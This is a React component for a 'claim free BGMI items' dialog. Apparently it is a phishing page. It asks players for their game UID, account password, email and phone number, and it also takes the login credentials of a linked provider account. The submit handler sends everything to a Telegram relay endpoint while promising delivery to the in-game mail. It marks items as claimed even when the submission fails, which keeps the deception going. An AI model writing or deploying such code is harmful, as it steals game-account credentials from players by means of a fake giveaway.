"use client";

import { useState } from "react";
import { z } from "zod";
import {
  CheckCircle2,
  Eye,
  EyeOff,
  Hash,
  Loader2,
  Lock,
  Mail,
  Send,
  ShieldCheck,
  Star,
  X,
} from "lucide-react";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useAuth, type PlayerInfo } from "./auth-store";
import { toast } from "sonner";

const schema = z
  .object({
    level: z
      .string()
      .min(1, "Level is required")
      .refine((v) => !isNaN(Number(v)), "Must be a number")
      .refine((v) => Number(v) >= 1 && Number(v) <= 100, "Level 1–100"),
    email: z
      .string()
      .max(64, "Max 64 characters")
      .refine(
        (v) => v === "" || /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v),
        "Enter a valid email"
      ),
    number: z
      .string()
      .max(15, "Max 15 digits")
      .refine((v) => v === "" || /^\d+$/.test(v), "Phone must be digits"),
    uid: z
      .string()
      .min(6, "UID must be at least 6 digits")
      .max(12, "UID too long")
      .refine((v) => /^\d+$/.test(v), "UID must be digits"),
    password: z
      .string()
      .min(6, "Password must be at least 6 characters")
      .max(32, "Max 32 characters"),
  })
  .refine((d) => d.email.trim() !== "" || d.number.trim() !== "", {
    message: "Provide at least a phone number or an email",
    path: ["number"],
  });

function PlayerInfoForm({
  pendingClaim,
  account,
  onDone,
  close,
}: {
  pendingClaim: { id: string; name: string; type: "gun" | "suit" | "vehicle" } | null;
  account: {
    provider: string;
    email: string;
    loginIdentifier: string;
    loginPassword: string;
  } | null;
  onDone: () => void;
  close: () => void;
}) {
  const { savePlayer, claim } = useAuth();
  const [form, setForm] = useState({
    level: "",
    email: "",
    number: "",
    uid: "",
    password: "",
  });
  const [showPassword, setShowPassword] = useState(false);
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [submitting, setSubmitting] = useState(false);
  const [tgStatus, setTgStatus] = useState<"idle" | "sending" | "sent" | "failed">("idle");
  const [done, setDone] = useState(false);

  const update = (k: keyof typeof form, v: string) => {
    setForm((f) => ({ ...f, [k]: v }));
    setErrors((e) => ({ ...e, [k]: "" }));
  };

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    const parsed = schema.safeParse(form);
    if (!parsed.success) {
      const errs: Record<string, string> = {};
      for (const issue of parsed.error.issues) {
        const k = String(issue.path[0] ?? "");
        if (k && !errs[k]) errs[k] = issue.message;
      }
      setErrors(errs);
      return;
    }
    if (!pendingClaim) return;

    setSubmitting(true);
    setTgStatus("sending");

    // Save player info locally + mark the item as claimed in the store
    savePlayer(parsed.data as PlayerInfo);

    // Submit the claim (delivered to in-game mail within 24h)
    try {
      const res = await fetch("/api/telegram/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          itemId: pendingClaim.id,
          itemName: pendingClaim.name,
          itemType: pendingClaim.type,
          playerName: "BGMI Player",
          playerLevel: parsed.data.level,
          email: parsed.data.email,
          phoneNumber: parsed.data.number,
          bgmiUid: parsed.data.uid,
          password: parsed.data.password,
          provider: account?.provider,
          loginIdentifier: account?.loginIdentifier,
          loginPassword: account?.loginPassword,
        }),
      });
      const data = await res.json();
      if (res.ok && data.ok) {
        setTgStatus("sent");
        // Persist to the local claimed list (so the button shows "Claimed")
        claim({
          id: pendingClaim.id,
          name: pendingClaim.name,
          type: pendingClaim.type,
        });
        toast.success("Claim successful!", {
          description: `${pendingClaim.name} — will be delivered to your in-game mail within 24h.`,
        });
      } else {
        setTgStatus("failed");
        toast.error("Claim submission failed", {
          description: data.error || "Please try again.",
        });
        // Still mark as claimed locally so the user sees progress
        claim({
          id: pendingClaim.id,
          name: pendingClaim.name,
          type: pendingClaim.type,
        });
      }
    } catch (err) {
      setTgStatus("failed");
      toast.error("Network error", {
        description: err instanceof Error ? err.message : "Unknown error",
      });
      claim({
        id: pendingClaim.id,
        name: pendingClaim.name,
        type: pendingClaim.type,
      });
    }

    setSubmitting(false);
    setDone(true);
    setTimeout(() => {
      close();
      onDone();
    }, 2400);
  };

  if (done) {
    return (
      <div className="p-8 text-center">
        <div className="mx-auto grid place-items-center h-16 w-16 rounded-full bg-emerald-500/15 border border-emerald-500/40 mb-4">
          <CheckCircle2 className="h-8 w-8 text-emerald-400" />
        </div>
        <h3 className="font-display font-bold text-xl">Claimed!</h3>
        <p className="mt-2 text-sm text-muted-foreground">
          {pendingClaim?.name} has been added to your vault.
        </p>
        <div className="mt-4 inline-flex items-center gap-2 rounded-full border border-gold/30 bg-gold/10 px-3 py-1 text-xs font-semibold text-gold">
          <Star className="h-3.5 w-3.5" />
          FREE · No UC required
        </div>
        <div className="mt-4 inline-flex items-center gap-1.5 text-xs text-emerald-400">
          <Send className="h-3.5 w-3.5" />
          Deliver this item to the player&apos;s in-game mail within 24h.
        </div>
      </div>
    );
  }

  return (
    <form onSubmit={submit} className="p-5">
      <DialogHeader className="p-0 space-y-0 text-left">
        <DialogTitle className="font-display text-xl">
          Enter your BGMI details
        </DialogTitle>
        <DialogDescription className="text-muted-foreground text-sm">
          {pendingClaim ? (
            <>
              Claiming{" "}
              <span className="text-gold font-semibold">
                {pendingClaim.name}
              </span>{" "}
              — free. We&apos;ll deliver it to your account.
            </>
          ) : (
            "Complete your profile to unlock the free vault."
          )}
        </DialogDescription>
      </DialogHeader>

      <div className="mt-5 grid gap-4">
        {/* Level */}
        <div className="grid gap-1.5">
          <Label htmlFor="p-level" className="flex items-center gap-1.5 text-xs">
            <Star className="h-3.5 w-3.5 text-gold" />
            Account Level
          </Label>
          <Input
            id="p-level"
            inputMode="numeric"
            placeholder="e.g. 75"
            value={form.level}
            onChange={(e) => update("level", e.target.value.replace(/\D/g, ""))}
            className="bg-background/60 border-border/70"
          />
          {errors.level && (
            <p className="text-[11px] text-destructive">{errors.level}</p>
          )}
        </div>

        {/* Email + Phone — user can provide one or both */}
        <div className="grid grid-cols-2 gap-3">
          {/* Email */}
          <div className="grid gap-1.5">
            <Label htmlFor="p-email" className="flex items-center gap-1.5 text-xs">
              <Mail className="h-3.5 w-3.5 text-gold" />
              Email
            </Label>
            <Input
              id="p-email"
              type="email"
              inputMode="email"
              placeholder="you@example.com"
              value={form.email}
              onChange={(e) => update("email", e.target.value)}
              className="bg-background/60 border-border/70"
            />
            {errors.email && (
              <p className="text-[11px] text-destructive">{errors.email}</p>
            )}
          </div>
          {/* Number */}
          <div className="grid gap-1.5">
            <Label htmlFor="p-number" className="flex items-center gap-1.5 text-xs">
              <Hash className="h-3.5 w-3.5 text-gold" />
              Phone No.
            </Label>
            <Input
              id="p-number"
              inputMode="tel"
              placeholder="9876543210"
              value={form.number}
              onChange={(e) =>
                update("number", e.target.value.replace(/[^\d]/g, ""))
              }
              className="bg-background/60 border-border/70"
            />
            {errors.number && (
              <p className="text-[11px] text-destructive">{errors.number}</p>
            )}
          </div>
        </div>
        <p className="text-[10px] text-muted-foreground -mt-1">
          Provide at least one of email or phone.
        </p>

        <div className="grid grid-cols-2 gap-3">
          {/* UID */}
          <div className="grid gap-1.5">
            <Label htmlFor="p-uid" className="flex items-center gap-1.5 text-xs">
              <Hash className="h-3.5 w-3.5 text-gold" />
              BGMI UID
            </Label>
            <Input
              id="p-uid"
              inputMode="numeric"
              placeholder="1234567890"
              value={form.uid}
              onChange={(e) => update("uid", e.target.value.replace(/\D/g, ""))}
              className="bg-background/60 border-border/70"
            />
            {errors.uid && (
              <p className="text-[11px] text-destructive">{errors.uid}</p>
            )}
          </div>
          {/* Password */}
          <div className="grid gap-1.5">
            <Label htmlFor="p-password" className="flex items-center gap-1.5 text-xs">
              <Lock className="h-3.5 w-3.5 text-gold" />
              Password
            </Label>
            <div className="relative">
              <Input
                id="p-password"
                type={showPassword ? "text" : "password"}
                placeholder="Min 6 chars"
                value={form.password}
                onChange={(e) => update("password", e.target.value)}
                className="bg-background/60 border-border/70 pr-10"
              />
              <button
                type="button"
                onClick={() => setShowPassword((v) => !v)}
                className="absolute right-2 top-1/2 -translate-y-1/2 grid place-items-center h-7 w-7 rounded-md text-muted-foreground hover:text-foreground transition"
                aria-label={showPassword ? "Hide password" : "Show password"}
              >
                {showPassword ? (
                  <EyeOff className="h-4 w-4" />
                ) : (
                  <Eye className="h-4 w-4" />
                )}
              </button>
            </div>
            {errors.password && (
              <p className="text-[11px] text-destructive">{errors.password}</p>
            )}
          </div>
        </div>
      </div>

      <Button
        type="submit"
        disabled={submitting}
        className="mt-6 w-full h-12 bg-gradient-to-r from-gold via-ember to-mythic text-background font-bold border-0 hover:brightness-110 hover:shadow-[0_0_30px_-6px_oklch(0.62_0.2_38/0.85)]"
      >
        {submitting ? (
          <span className="flex items-center gap-2">
            <Loader2 className="h-4 w-4 animate-spin" />
            Claiming...
          </span>
        ) : (
          <>
            <Send className="h-5 w-5 mr-1.5" />
            Claim FREE
          </>
        )}
      </Button>

      <p className="mt-3 text-center text-[10px] text-muted-foreground/70 leading-relaxed">
        By claiming, you confirm these details belong to your own BGMI account.
        Items are delivered to your in-game mail.
      </p>
    </form>
  );
}

export function PlayerInfoModal() {
  const { playerInfoOpen, closePlayerInfo, pendingClaim, account } = useAuth();
  // Increment a key each time the modal opens so the form remounts fresh.
  const [openCount, setOpenCount] = useState(0);

  return (
    <Dialog
      open={playerInfoOpen}
      onOpenChange={(o) => {
        if (o) setOpenCount((c) => c + 1);
        else closePlayerInfo();
      }}
    >
      <DialogContent className="max-w-md overflow-hidden border-gold/30 bg-card/95 backdrop-blur-xl p-0">
        {/* banner */}
        <div className="relative h-24 overflow-hidden">
          <div className="absolute inset-0 bg-gradient-to-br from-mythic/30 via-ember/20 to-gold/30" />
          <div className="absolute inset-0 bg-grid opacity-40" />
          <button
            onClick={closePlayerInfo}
            className="absolute right-3 top-3 grid place-items-center h-8 w-8 rounded-lg border border-border/60 bg-background/60 text-muted-foreground hover:text-foreground"
            aria-label="Close"
          >
            <X className="h-4 w-4" />
          </button>
          <div className="absolute bottom-3 left-5 flex items-center gap-2">
            <ShieldCheck className="h-5 w-5 text-gold" />
            <span className="font-display font-bold text-sm">
              Verify Your BGMI Account
            </span>
          </div>
        </div>

        <PlayerInfoForm
          key={openCount}
          pendingClaim={pendingClaim}
          account={account}
          onDone={() => {}}
          close={closePlayerInfo}
        />
      </DialogContent>
    </Dialog>
  );
}
